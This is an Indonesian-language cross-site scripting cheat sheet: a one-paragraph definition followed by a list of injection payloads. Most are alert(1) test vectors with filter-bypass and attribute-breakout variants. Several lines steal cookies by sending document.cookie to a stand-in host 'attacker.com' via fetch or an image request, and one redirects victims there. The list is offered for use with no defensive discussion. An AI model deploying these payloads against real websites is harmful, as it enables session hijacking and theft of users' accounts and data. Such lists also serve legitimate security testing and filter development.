# Cross-Site Scripting XSS

## Pengertian

**Cross-Site Scripting (XSS)** adalah serangan di mana penyerang menyisipkan kode JavaScript berbahaya ke dalam halaman web. Saat korban membuka halaman tersebut, script akan dijalankan di browser korban, memungkinkan pencurian data seperti cookie, session, atau manipulasi DOM.

## Payload

```
<script>alert(1)</script>

<svg/onload=alert(1)>

<img src=x onerror=alert(1)>

<iframe src="javascript:alert(1)"></iframe>

<img src=x onerror=prompt(1)>

<svg><animate onbegin=alert(1)>

<video><source onerror=alert(1)>

<details open ontoggle=alert(1)>

<marquee onstart=alert(1)>

https://example.com/?q=<script>alert(1)</script>

https://example.com/#<img src=x onerror=alert(1)>

https://example.com/?x="><img src=x onerror=alert(1)>

";alert(1);//

';alert(1);//

";location='http://attacker.com'//

#<script>alert(1)</script>

#<img src=x onerror=alert(1)>

#<svg/onload=alert(1)>

"><svg/onload=alert(1)>

"><img src=x onerror=alert(1)>

"><script>alert(1)</script>

<svg><script>alert(1)</script>

<math><mtext></mtext><script>alert(1)</script>

<video><source onerror=alert(1)>

<details open ontoggle=alert(1)>

<script>new Image().src='http://attacker.com/?c='+document.cookie</script>

<script>fetch('http://attacker.com/?x='+document.cookie)</script>

<scr<script>ipt>alert('1')</script>

<SCRIPT>document.write('<img src=/' + document.cookie + '>');</SCRIPT>
```
